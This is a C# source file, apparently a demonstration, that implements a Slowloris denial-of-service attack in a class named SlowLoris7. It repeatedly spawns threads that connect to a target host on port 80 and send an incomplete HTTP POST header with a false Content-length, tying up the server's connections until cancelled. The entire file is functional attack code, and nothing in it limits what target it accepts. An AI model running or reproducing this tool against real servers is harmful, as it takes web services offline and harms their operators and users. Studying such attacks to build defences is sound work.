using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace DoSMethodsDemonstration
{
    public class SlowLoris7
    {
        public string Host { get; private set; }

        public CancellationToken CancelToken { get; private set; }

        public int Delay { get; private set; }

        public SlowLoris7(string host, CancellationToken cancelToken, int delay)
        {
            Host = host;
            CancelToken = cancelToken;
            Delay = delay;
        }

        public void Manage()
        {
            ThreadStart start = null;
            var clients = new List<TcpClient>();

            while (!CancelToken.IsCancellationRequested)
            {
                if (start == null)
                {
                    start = async delegate
                    {
                        var item = new TcpClient();
                        clients.Add(item);
                        try
                        {
                            await item.ConnectAsync(Host, 80);
                            var writer = new StreamWriter(item.GetStream());
                            writer.Write("POST / HTTP/1.1\r\nHost: " + Host + "\r\nContent-length: 5235\r\n\r\n");
                            writer.Flush();
                            Console.WriteLine("wrote");
                        }
                        catch (Exception err)
                        {
                            Console.WriteLine(err.Message);
                        }
                    };
                }
                new Thread(start).Start();
                //Thread.Sleep(250);
                Thread.Sleep(Delay);
            }
            foreach (var client in clients)
            {
                try
                {
                    client.GetStream().Dispose();
                }
                catch
                {
                }
            }
        }
    }
}